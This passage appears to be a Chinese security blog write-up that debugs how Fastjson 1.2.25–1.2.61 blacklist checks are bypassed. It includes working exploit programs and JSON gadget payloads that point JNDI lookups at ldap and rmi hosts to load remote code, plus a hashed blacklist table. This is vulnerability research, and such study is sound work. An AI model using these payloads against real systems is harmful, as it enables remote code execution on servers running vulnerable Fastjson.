class="line">org.springframework</span><br></pre></td></tr></table></figure><p>调试中可以看到因为autoTypeSupport为False所以进行黑名单校验然后抛异常退出，那么看看autoTypeSupport是什么</p><h3 id="autoTypeSupport"><a href="#autoTypeSupport" class="headerlink" title="autoTypeSupport"></a>autoTypeSupport</h3><p>autoTypeSupport是<code>checkAutoType()</code>函数出现后ParserConfig.java中新增的一个配置选项，在<code>checkAutoType()</code>函数的某些代码逻辑起到开关的作用。</p><p>默认情况下autoTypeSupport为False，将其设置为True有两种方法：</p><ul><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeSupport=true</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().setAutoTypeSupport(true);</code>，如果有使用非全局ParserConfig则用另外调用<code>setAutoTypeSupport(true);</code></li></ul><p>AutoType白名单设置方法：</p><ol><li>JVM启动参数：<code>-Dfastjson.parser.autoTypeAccept=com.xx.a.,com.yy.</code></li><li>代码中设置：<code>ParserConfig.getGlobalInstance().addAccept(&quot;com.xx.a&quot;);</code></li><li>通过fastjson.properties文件配置。在1.2.25&#x2F;1.2.26版本支持通过类路径的fastjson.properties文件来配置，配置方式如下：<code>fastjson.parser.autoTypeAccept=com.taobao.pac.client.sdk.dataobject.,com.cainiao.</code></li></ol><h2 id="1-2-25-1-2-41绕过"><a href="#1-2-25-1-2-41绕过" class="headerlink" title="1.2.25~1.2.41绕过"></a>1.2.25~1.2.41绕过</h2><p>先看exp，server端和之前一样</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;Lcom.sun.rowset.JdbcRowSetImpl;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000869.png" alt="image-20230828000012407"><br>和之前的区别就是开启了autoTypeSupport然后在<code>com.sun.rowset.JdbcRowSetImpl</code>开头加了个<code>L</code>结尾加个<code>;</code>这样就绕过了<br>下面调试一下，这里的<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>类是不存在的<br>这里可以看到autoTypeSupport已经变为true了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000553.png" alt="image-20230828000033226"><br>然后来到了黑名单校验<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280000542.png" alt="image-20230828000052244"><br>这里会一个个检验最终检验不到跳出，可以自己手动跳出不然会判断很久，然后继续往下来到下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001155.png" alt="image-20230828000106862"><br>进入这个loadClass，在下面这里会对类进行判断如果类的首尾是<code>L</code>和<code>;</code>后去掉首尾变为<code>com.sun.rowset.JdbcRowSetImpl</code>储存在newClassName<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001776.png" alt="image-20230828000134596"><br>最终在下面下面这里返回clazz即<code>com.sun.rowset.JdbcRowSetImpl</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280001183.png" alt="image-20230828000147996"><br>后面就和之前的差不多了</p><h2 id="1-2-25-1-2-42-绕过"><a href="#1-2-25-1-2-42-绕过" class="headerlink" title="1.2.25~1.2.42 绕过"></a>1.2.25~1.2.42 绕过</h2><p>在1.2.42版本发现上面的这个exp打不通了，新的exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调试看一下，在下面这里调用了<code>checkAutoType</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002478.png" alt="image-20230828000205928"><br>跟进去看一下，在下面这里我们发现类名变为了<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>少了个<code>L</code>和<code>;</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002312.png" alt="image-20230828000223809"><br>返回看下处理逻辑，发现这里的处理逻辑不再是明文，采用了加密混淆<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002998.png" alt="image-20230828000242717"><br>并且黑名单也变为了如下形式<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280002931.png" alt="image-20230828000257574"><br>Fastjson把原本明文形式的黑名单改成了哈希过的黑名单，但是有人已在Github上跑出了大部分黑名单包类：<br><a href="https://github.com/LeadroyaL/fastjson-blacklist">LeadroyaL&#x2F;fastjson-blacklist (github.com)</a><br>实际上就是如果类名首尾存在<code>L</code>和<code>;</code>就会进行去除<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280003632.png" alt="image-20230828000322073"><br>可以看到此时<code>className</code>变为了<code>Lcom.sun.rowset.JdbcRowSetImpl;</code>最终会走到下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280003168.png" alt="image-20230828000344652"><br>后面的处理步骤就和1.2.41一样了，这里修复的感觉和我平时做事一样，考虑不全只去除了一次<code>L</code>和<code>;</code></p><h2 id="1-2-25-1-2-43-绕过"><a href="#1-2-25-1-2-43-绕过" class="headerlink" title="1.2.25~1.2.43 绕过"></a>1.2.25~1.2.43 绕过</h2><p>这里上面的exp已经打不通了，不过先拿那个调一下看看在43版本是怎么处理的<br>首先是下面这里的判断，上面忘记说了，类名长度不能超过128且不能小于3否则抛出异常<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004334.png" alt="image-20230828000404217"><br>可以看到在下面这里直接抛出了异常<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004636.png" alt="image-20230828000423114"><br>在第二个if中对以LL开头的类直接抛出异常<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004731.png" alt="image-20230828000440591"><br>在<code>TypeUtils.loadClass</code>中还有个对以<code>[</code>开头的类进行加载<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280004881.png" alt="image-20230828000452772"><br>那么将exp改下以<code>[</code>开头自然就能绕过上面的if检测，然后继续调试来到下面这里<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005032.png" alt="image-20230828000506507"><br>经过调试发现只是加个<code>[</code>虽然能过检测但是无法弹出计算器且会报如下的错误<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005738.png" alt="image-20230828000523575"><br>上面返回的类名是<code>[com.sun.rowset.JdbcRowSetImpl</code>后面要完成的是反序列化，那么这个问题应该就是出在反序列化的步骤，继续调试，在下面这里可以看到返回的clazz是<code>[Lcom.sun.rowset.JdbcRowSetImpl;</code><br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005550.png" alt="image-20230828000538012"><br>找到了抛出异常的位置在<code>parseArray</code>方法中<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280005509.png" alt="image-20230828000557991"><br>那么解决这个报错问题是不是就行了呢？先试试，解决报错根据上面的报错改，上面的报错如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exepct <span class="string">&#x27;[&#x27;</span>, but ,, pos <span class="number">42</span>, json : &#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;[com.sun.rowset.JdbcRowSetImpl&quot;</span>,<span class="string">&quot;dataSourceName&quot;</span>:<span class="string">&quot;ldap://127.0.0.1:1099/ExportObject&quot;</span>,<span class="string">&quot;autoCommit&quot;</span>:<span class="string">&quot;true&quot;</span> &#125;</span><br></pre></td></tr></table></figure><p>在42的位置期待是<code>[</code>但是为<code>,</code>那么把exp改为如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span></span><br></pre></td></tr></table></figure><p>这次又报错了，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syntax error, expect &#123;, actual string, pos <span class="number">43</span>, fastjson-version <span class="number">1.2</span><span class="number">.43</span></span><br></pre></td></tr></table></figure><p>在43的位置期待为<code>&#123;</code>那么加个看看</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;</span><br></pre></td></tr></table></figure><p>弹出计算器成功<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006164.png" alt="image-20230828000622738"><br>exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/ExportObject\&quot;,\&quot;autoCommit\&quot;:\&quot;true\&quot; &#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-2-25-1-2-45绕过"><a href="#1-2-25-1-2-45绕过" class="headerlink" title="1.2.25~1.2.45绕过"></a>1.2.25~1.2.45绕过</h2><p>在这个版本中，利用的是<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>对黑名单绕过，但是有一定的前提条件<br><strong>前提条件：需要目标服务端存在mybatis的jar包，且版本需为3.x.x系列&lt;3.5.0的版本。</strong><br>这里ldap和rmi都能打，换个协议就行，本地的话server当然就要起rmi的了<br>导入mybatis的依赖</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;  </span><br><span class="line">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;  </span><br><span class="line">    &lt;artifactId&gt;mybatis&lt;/artifactId&gt;  </span><br><span class="line">    &lt;version&gt;<span class="number">3.4</span><span class="number">.4</span>&lt;/version&gt;  </span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass45</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span><span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parse(payload);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006203.png" alt="image-20230828000637764"><br>下面调试看一下，如下可以看到类名如果以<code>[</code>开头直接抛出异常结束<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280006859.png" alt="image-20230828000653345"><br>下面这里由于<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>不在黑名单进而绕过检测<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007332.png" alt="image-20230828000710816"><br>然后就算对这个类的利用分析，通过exp可以看到是对properties属性的利用，由于在<code>deserialze</code>方法下不太好调（技术太菜）直接来到<code>JndiDataSourceFactory</code>类下，看到存在setter方法为<code>setProperties()</code>fastjson能够自动调用，直接在该setter方法打断点，然后就是存在JNDI注入了，即<code>InitialContext.lookup()</code>，其中参数由我们输入的properties属性中的data_source值获取的：<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007822.png" alt="image-20230828000726311"></p><h2 id="1-2-25-1-2-47绕过"><a href="#1-2-25-1-2-47绕过" class="headerlink" title="1.2.25~1.2.47绕过"></a>1.2.25~1.2.47绕过</h2><p>在1.2.47版本中上面的exp又不行了，原因是这个类到黑名单去了<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280007057.png" alt="image-20230828000743553"><br>这次利用的是之前的payload在默认不开启AutoTypeSupport的情况下通过缓存加载<code>JdbcRowSetImpl</code>类，exp如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass47</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008657.png" alt="image-20230828000800194"><br>继续调试一下，在这里就可以结合着组长的那个图来分析了</p><ul><li><p>在第一个中，因为在白名单中才能够进行缓存，所以这里不符合要求，第三个同理</p></li><li><p>在第二个返回类当中，期望类为空且类与期望类一致的时候返回类，这里我们的期望类为空，所以这里能够符合条件，所以我们在往上找，只要缓存中存在类，我们就能够进行加载。</p></li><li><p>第四个是基于期望类的，因为这里和期望类并无关所以也满足不了</p></li><li><p>进入false来到第五个，又因为默认情况下AutoType为false，所以也加载不了<br>所以现在就在缓存这块下功夫，看一下如何在缓存里面找到我们想要的类，这一块儿的流程如下图<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008433.png" alt="image-20230828000816375"><br>由于AutoType为false所以不会进入第一轮的黑名单检测来到<code>TypeUtils.getClassFromMapping</code>跟进来看看<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008797.png" alt="image-20230828000829713"><br>发现是从mappings里面找缓存，然后find uages看看mappings什么时候赋值，复现进行赋值的地方很多，但是大多是指定了一些基础类进行的缓存而loadClass这里只要我们加载类成功以后，他就会放入缓存中，下次调用直接从缓存中进行加载，这里我们就要想怎么才能够在loadClass的时候将我们的类加载入缓存当中<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008627.png" alt="image-20230828000844112"><br>然后继续寻找loadClass的调用，最终是找到了MiscCodec这个类，不知道为什么我find uages的时候找不到，如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280008818.png" alt="image-20230828000858293"><br>没办法只能手动进入了，在<code>MiscCodec.deserialze()</code>中进行调用如下<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009792.png" alt="image-20230828000915703"><br>现在来看看这个MiscCodec是个什么，发现它实现了序列化与反序列化的接口在fastJson的反序列化中也会把他当作反序列化器来进行调用<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009894.png" alt="image-20230828000925778"><br>所以如果FastJson反序列化的类是属于Class.class的时候，就会调用MiscCodec反序列化器，然后调用loadClass，在传入我们想传入的字符串strVal后loadClass就会将字符串作为String className进行加载并放在缓存里面。<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009849.png" alt="image-20230828000938335"><br>然后这里的有个检测要满足不然就会抛异常，即strVal的键是否为val是的话再提取它的值<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280009092.png" alt="image-20230828000951923"><br>然后赋值到objVal上<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010262.png" alt="image-20230828001004053"><br>最后赋值给strVal<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010150.png" alt="image-20230828001017952"><br>然后在缓存里面找到<code>com.sun.rowset.JdbcRowSetImpl</code>返回clazz<br><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280010162.png" alt="image-20230828001032000"><br>最终的exp，这个的payload两次流程得写在一起一次性完成不然就读取不到缓存了，写法如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> bypass;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.serializer.MiscCodec;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">bypass47</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,&#123;\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;DataSourceName\&quot;:\&quot;ldap://127.0.0.1:1099/remoteObj\&quot;,\&quot;AutoCommit\&quot;:\&quot;false\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(s);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Y0n3er/img/master/blogimg/202308280011388.png" alt="image-20230828001101946"><br>而在1.2.48版本中缓存开关cache默认设置为了False，这个就不行了，同时这个方法在47及前面的版本利用也分为了两段</p></li><li><p>1.2.25-1.2.32版本：未开启AutoTypeSupport时能成功利用，开启AutoTypeSupport反而不能成功触发；</p></li><li><p>1.2.33-1.2.47版本：无论是否开启AutoTypeSupport，都能成功利用；</p></li></ul><h2 id="Fastjson-lt-x3D-1-2-61-通杀"><a href="#Fastjson-lt-x3D-1-2-61-通杀" class="headerlink" title="Fastjson &lt;&#x3D; 1.2.61 通杀"></a>Fastjson &lt;&#x3D; 1.2.61 通杀</h2><p>这个就记录一下payload吧，懒得跟了，看起来像是黑名单的绕过</p><h3 id="Fastjson1-2-5-lt-x3D-1-2-59"><a href="#Fastjson1-2-5-lt-x3D-1-2-59" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.59"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.59</h3><p><strong>需要开启AutoType</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;metricRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.zaxxer.hikari.HikariConfig&quot;</span>,<span class="string">&quot;healthCheckRegistry&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-x3D-1-2-60"><a href="#Fastjson1-2-5-lt-x3D-1-2-60" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.60"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.60</h3><p><strong>无需开启 autoType：</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;oracle.jdbc.connector.OracleManagedConnectionFactory&quot;</span>,<span class="string">&quot;xaDataSourceName&quot;</span>:<span class="string">&quot;rmi://10.10.20.166:1099/ExportObject&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.configuration.JNDIConfiguration&quot;</span>,<span class="string">&quot;prefix&quot;</span>:<span class="string">&quot;ldap://10.10.20.166:1389/ExportObject&quot;</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="Fastjson1-2-5-lt-x3D-1-2-61"><a href="#Fastjson1-2-5-lt-x3D-1-2-61" class="headerlink" title="Fastjson1.2.5 &lt;&#x3D; 1.2.61"></a>Fastjson1.2.5 &lt;&#x3D; 1.2.61</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.apache.commons.proxy.provider.remoting.SessionBeanProvider&quot;</span>,<span class="string">&quot;jndiName&quot;</span>:<span class="string">&quot;ldap://localhost:1389/Exploi</span></span><br></pre></td></tr></table></figure><h2 id="已知哈希黑名单"><a href="#已知哈希黑名单" class="headerlink" title="已知哈希黑名单"></a>已知哈希黑名单</h2><p>目前已知的哈希黑名单的对应表如下：</p><table><thead><tr><th>version</th><th>hash</th><th>hex-hash</th><th>name</th></tr></thead><tbody><tr><td>1.2.42</td><td>-8720046426850100497</td><td>0x86fc2bf9beaf7aefL</td><td>org.apache.commons.collections4.comparators</td></tr><tr><td>1.2.42</td><td>-8109300701639721088</td><td>0x8f75f9fa0df03f80L</td><td>org.python.core</td></tr><tr><td>1.2.42</td><td>-7966123100503199569</td><td>0x9172a53f157930afL</td><td>org.apache.tomcat</td></tr><tr><td>1.2.42</td><td>-7766605818834748097</td><td>0x9437792831df7d3fL</td><td>org.apache.xalan</td></tr><tr><td>1.2.42</td><td>-6835437086156813536</td><td>0xa123a62f93178b20L</td><td>javax.xml</td></tr><tr><td>1.2.42</td><td>-4837536971810737970</td><td>0xbcdd9dc12766f0ceL</td><td>org.springframework.</td></tr><tr><td>1.2.42</td><td>-4082057040235125754</td><td>0xc7599ebfe3e72406L</td><td>org.apache.commons.beanutils</td></tr><tr><td>1.2.42</td><td>-2364987994247679115</td><td>0xdf2ddff310cdb375L</td><td>org.apache.commons.collections.Transformer</td></tr><tr><td>1.2.42</td><td>-1872417015366588117</td><td>0xe603d6a51fad692bL</td><td>org.codehaus.groovy.runtime</td></tr><tr><td>1.2.42</td><td>-254670111376247151</td><td>0xfc773ae20c827691L</td><td>java.lang.Thread</td></tr><tr><td>1.2.42</td><td>-190281065685395680</td><td>0xfd5bfc610056d720L</td><td>javax.net.</td></tr><tr><td>1.2.42</td><td>313864100207897507</td><td>0x45b11bc78a3aba3L</td><td>com.mchange</td></tr><tr><td>1.2.42</td><td>1203232727967308606</td><td>0x10b2bdca849d9b3eL</td><td>org.apache.wicket.util</td></tr><tr><td>1.2.42</td><td>1502845958873959152</td><td>0x14db2e6fead04af0L</td><td>java.util.jar.</td></tr><tr><td>1.2.42</td><td>3547627781654598988</td><td>0x313bb4abd8d4554cL</td><td>org.mozilla.javascript</td></tr><tr><td>1.2.42</td><td>3730752432285826863</td><td>0x33c64b921f523f2fL</td><td>java.rmi</td></tr><tr><td>1.2.42</td><td>3794316665763266033</td><td>0x34a81ee78429fdf1L</td><td>java.util.prefs.</td></tr><tr><td>1.2.42</td><td>4147696707147271408</td><td>0x398f942e01920cf0L</td><td>com.sun.</td></tr><tr><td>1.2.42</td><td>5347909877633654828</td><td>0x4a3797b30328202cL</td><td>java.util.logging.</td></tr><tr><td>1.2.42</td><td>5450448828334921485</td><td>0x4ba3e254e758d70dL</td><td>org.apache.bcel</td></tr><tr><td>1.2.42</td><td>5751393439502795295</td><td>0x4fd10ddc6d13821fL</td><td>java.net.Socket</td></tr><tr><td>1.2.42</td><td>5944107969236155580</td><td>0x527db6b46ce3bcbcL</td><td>org.apache.commons.fileupload</td></tr><tr><td>1.2.42</td><td>6742705432718011780</td><td>0x5d92e6ddde40ed84L</td><td>org.jboss</td></tr><tr><td>1.2.42</td><td>7179336928365889465</td><td>0x6